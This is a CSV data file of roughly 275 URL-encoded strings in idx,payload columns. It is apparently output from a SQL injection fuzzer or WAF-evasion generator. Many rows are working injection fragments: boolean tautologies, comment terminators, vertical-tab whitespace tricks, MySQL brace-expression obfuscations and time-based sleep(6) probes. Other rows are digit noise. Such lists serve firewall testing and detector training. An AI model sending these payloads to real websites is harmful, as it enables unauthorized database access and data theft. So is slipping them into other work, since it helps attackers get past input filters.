idx,payload
0,11+or%270
0,007--%270
0,0%27%0b||%271+like%0b{`if`+1}=1%0bor%27
0,00%23
0,or+not+{x+(select%0b1)}=1=%0b(!+{`if`%0b1}=1)+or'0
1,10
1,10
1,06&&%0b
1,01%23
1,01--&&3%23
2,70(930
2,8320
2,0050
2,07--5%23
2,or+{x+(select%0b1)}=1%0blike+{a+1}=1%0bor'0
3,33%0bor%27{a+1}=1%0blike%0b{x%0b(select%0b1)}=1+or%27
3,37191+
3,10+||'a%27'a%27%0b||%27+or%270
3,9015--4
3,20%2339--1%23
4,11+or%270
4,80%0b(select+0)%23
4,10(10
4,001%0b||'not+{x+(select+1)}=1=%0b(!+{a%0b1}=1)%0bor%27
4,195180
5,7409319||%270
5,1+||%0bnot+{x+(select%0b1)}=1=%0b(not+{x%0b(select%0b1)}=1)+or%27
5,01%23'0
5,0--%23
5,010%23
6,12||'{`if`+1}=1)%0bor%270
6,0%23
6,0'||+not~0=%0b(not%0b{x+(select%0b1)}=1)+||%27
6,0or%270||%27
6,4060
7,0%27||%27not+{x%0b(select+1)}=1=%0b(not+true)%0bor%27
7,0+or+{`if`%0b1}=1)%0b||%27
7,0--78%0b
7,69or+1%0bis%0bfalse%0bor%27
7,29%23
8,60'6--4or%270
8,0070%270
8,00%231--%23
8,9617117%270
8,10%2330
9,20010
9,060%23
9,5401810
9,70--%23
9,80%0b(select+0)%23
10,111110%270
10,0or+not+{`if`+1}=1=+(!%0b{x+(select%0b1)}=1)%0b
10,051+||%27not+{x%0b(select+1)}=1=%0b(!+{`if`+1}=1)%0b||%27
10,11%0b||%270
10,00%0b||%27{x+(select+1)}=1%0blike+{a+1}=1+or%27
11,01%0b||'!+||'0
11,7720000||%0b
11,30128
11,51+or'a'=%27a'%0b||%270
11,83+||%27not+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1)%0bor%27
12,00%23
12,08+0+||'0
12,70+||'{x+(select+1)}=1+like%0b{`if`+1}=1%0bor%27
12,68%23885%0b
12,6%0b0)+
13,01+||+not+true=%0b(!+{a+1}=1)%0bor'
13,833+1%0bor'0
13,10--%23
13,8%0b1)+
13,00000'0
14,46%0b||%27{x+(select%0b1)}=1+like%0btrue+||%27
14,0005%23%270
14,70%271--%0b
14,0%27||%0bnot+{a%0b1}=1)+or'
14,90%23480
15,70+select+or'not%0b{x%0b(select%0b1)}=1%0b||%270
15,992or%0b{a%0b1}=1+like+{`if`+1}=1+or'
15,88+or%27{x+(select%0b1)}=1+like%0btrue%0bor%27
15,91+or'a%27%27a%27+or%27+or%271
15,43+or%27{x+(select%0b1)}=1+like+{x%0b(select+1)}=1+||%27
16,0%27or+{x+(select%0b1)}=1)+or'
16,50818
16,01%233
16,1or%0b--%0b
16,4710
17,or+!+{x+(select+1)}=1=+(false)%0bor%270
17,1+or%0b{x+(select+1)}=1%0blike%0b{x+(select+1)}=1%0b||%27
17,00%2348--
17,00
17,01+or%27a%27%27a'+||'%0b||%270
18,0sleep6%230or%27
18,<0--%0b
18,<00or%27
18,<00false%23
18,<5080
19,830718
19,0054%270
19,22+||%27{`if`%0b1}=1+like%0b{x+(select%0b1)}=1+or'
19,0402||%270
19,1+||+{x+(select%0b1)}=1+like+1+
20,80or+
20,8+0+
20,07%0b||%27{x+(select+1)}=1%0blike%0b{x%0b(select%0b1)}=1%0bor%27
20,1++
20,09%0b||%27{`if`%0b1}=1%0blike+true+or'
21,45+||'{x+(select%0b1)}=1%0blike+{x+(select+1)}=1+||%27
21,8or1or%270or'0
21,85%0b||%27{a+1}=1+like+{x+(select+1)}=1+or'
21,65%0bor%27{`if`%0b1}=1+like+{x%0b(select+1)}=1%0bor'
21,4%0bor'{a+1}=1)%0b||%270
22,||%0bnot+1=%0b(!%0b{x+(select%0b1)}=1)+||%27
22,or+not%0b{x%0b(select+1)}=1=+(!%0b{`if`+1}=1)+||'
22,or%0b!%0b{`if`%0b1}=1=+(not%0b{x+(select+1)}=1)%0bor'
22,or+not%0b1=+(not+{x%0b(select+1)}=1)%23
22,374
23,0400%27%0bor'a%27=%27a%27+||%27
23,003%23
23,44+||%27{x+(select%0b1)}=1+like+{x+(select+1)}=1%0b||%27
23,10%23
23,0050'or'
24,440%271||%270
24,4++7&&+9not%0b{x%0b(select+1)}=1%0b
24,02%0b||'not%0b{x%0b(select%0b1)}=1=+(!+{`if`%0b1}=1)%0bor%27
24,0--0
24,80%23
25,620
25,17088or%270
25,17050
25,100%23'0
25,60%230
26,01%0b||%27
26,0354%23
26,30%23(~+
26,800(%7e+or%270
26,0200%270
27,980000||%27
27,0000%270
27,0%230
27,0or+or%27!+{x+(select%0b1)}=1)+or%27
27,60000000or%270
28,0000%23||
28,06%0b||'{x%0b(select%0b1)}=1%0blike%0b{x+(select%0b1)}=1%0b||'
28,10%235--6
28,80%2356419
28,08%0bor%27{a%0b1}=1%0blike%0b{`if`+1}=1+||%27
29,78+or'{x%0b(select%0b1)}=1%0blike+{x+(select+1)}=1+||'
29,48+||'1%0blike%0btrue+||%270
29,71%0bor'a'%0bor%270
29,20--0
29,36%0b||%27{x+(select+1)}=1%0blike%0b{`if`%0b1}=1+||%27
30,0--%270
30,070'0
30,120
30,30188
30,0001--
31,1%0b||+{`if`+1}=1%0blike+{x%0b(select+1)}=1+||%27
31,35+||%27{a+1}=1+like+{a%0b1}=1+||%27
31,10%23
31,19012
31,10790
32,00%23||'0
32,80+||'{`if`+1}=1+like+{x%0b(select+1)}=1%0b||%27
32,10+or%270
32,51+||%27a%27=%27a%27+||%270
32,005--650%270
33,70%0b(1)+
33,01--0or%27
33,002%23%270
33,29%0bor%27{`if`%0b1}=1+like%0b{x+(select+1)}=1+or'
33,081%0bor%270
34,0%23%270
34,104--1||%270||'
34,108and%0b||'
34,286or41)10or'0
34,030
35,74+||'{x%0b(select+1)}=1+like+{`if`+1}=1%0b||%27
35,or+not+{a+1}=1=%0b(not+1)%0b||%270
35,0'or+not%0b{a+1}=1)+or%27
35,00%0bor%27{a+1}=1%0blike+{a+1}=1+||%27
35,00%27
36,||%0b!%0b{x+(select%0b1)}=1=+(not%0b{`if`%0b1}=1)+or%270
36,or+{a+1}=1+like%0b{x%0b(select+1)}=1+||%270
36,||+not+true=+(!%0b{a+1}=1)%0b||'0
36,51<@%0bor+{`if`+1}=1%0blike%0b{x%0b(select+1)}=1%0b||%27
36,or+{x%0b(select+1)}=1%0blike%0b{a%0b1}=1+||%270
37,00%238--%270
37,0+or%27!+true=%0b(not+{x%0b(select%0b1)}=1)+||'
37,619713
37,0%237%23
37,8%0bor+!+1=+(!%0b1)+
38,50--+
38,1%23
38,570%270
38,0090'1or%27
38,1--55--1%23
39,090+or'not%0btrue=%0b(not+{x%0b(select%0b1)}=1)%0b||'
39,008%23
39,133||%0b{x%0b(select%0b1)}=1+like%0b{`if`+1}=1+or'
39,00--3--%27
39,531040
40,8--1--0
40,00--%0b
40,1+or+{a+1}=1%0blike+{x+(select+1)}=1+||'
40,20----+
40,4%0b||+{x+(select+1)}=1%0blike+{a+1}=1--+
41,49+3select+5<(not%0bfalse)--%0b
41,10----20
41,0%271%23
41,50----1+
41,0190
42,66180
42,19110
42,70%270
42,3000%23
42,76%0b||%27{x%0b(select%0b1)}=1+like+{x%0b(select+1)}=1+||%27
43,00%0b||%27{`if`%0b1}=1%0blike+{x%0b(select+1)}=1+||%27
43,15%0b||%270
43,70--%0b
43,0--03||'0
43,88811188
44,0801%23
44,97140
44,481700||'0
44,01%23
44,170+--+||%27not%0btrue=%0b(not+1)+or%270
45,700
45,184or8or%27{`if`+1}=1)+or'0
45,4%0b||%27{x+(select%0b1)}=1)+or%27
45,04540or%27
45,06%0b||'{x%0b(select+1)}=1+like+{a+1}=1%0b||'
46,41+or%27a'=%27a%27+||%270
46,45%0bsleep(6)--+
46,0%27||+{`if`+1}=1)%0bor'0
46,0'+||%27{x%0b(select+1)}=1+like%0b{x%0b(select+1)}=1+or%27
46,27+7+||'1+or%270
47,0'+or%27not+1=%0b(!+{x+(select%0b1)}=1)+||%27
47,12||+
47,071--1--'1
47,26%0bor%27{x%0b(select+1)}=1+like+{`if`+1}=1%0bor'
47,11%0bor%27a%27%27a%27%0bor%27+||%27
48,000
48,58%0b(0)+
48,55+or'{`if`%0b1}=1%0blike+{x+(select%0b1)}=1%0b||%27
48,73%0b0--%0b
48,17210
49,10%23
49,0804%23
49,692or8or%270or%270
49,1%0b||+not+{x%0b(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1)+||%27
49,51+or%270
50,||%0b{x+(select+1)}=1%0blike%0b{x+(select+1)}=1--+
50,||%0bnot%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)%23
50,or%0b!~false=+(not%0btrue)--+
50,or+{a+1}=1+like%0b{x+(select%0b1)}=1%23
50,or+not~0=+(!%0b{`if`%0b1}=1)%23
51,81+or'0
51,545||%0b{`if`+1}=1%0blike+{`if`+1}=1+||%27
51,58+or'{x+(select+1)}=1+like%0b{x+(select%0b1)}=1%0bor%27
51,88%0b||'{`if`+1}=1%0blike+{a+1}=1%0bor%27
51,0%0bor'{x+(select+1)}=1)+or%270
52,0070+or'
52,18060
52,00980
52,9910
52,42+||%27{a+1}=1+like+{x+(select+1)}=1%0b||%27
53,001+||'{x+(select+1)}=1+like%0b{`if`%0b1}=1+or%27
53,8018
53,10%23
53,130%23
53,10----and%0b
54,0!@<@%0bor%0bnot%0b{a+1}=1=+(!~false)+or'
54,61<@+||+{x+(select%0b1)}=1+like%0b{x+(select+1)}=1%0bor%27
54,0!@<@.%0b||%0b!%7efalse=%0b(!%0btrue)+or%27
54,14+||%27
54,0@<@.+or%0b{x%0b(select+1)}=1+like+{x+(select+1)}=1%0bor'
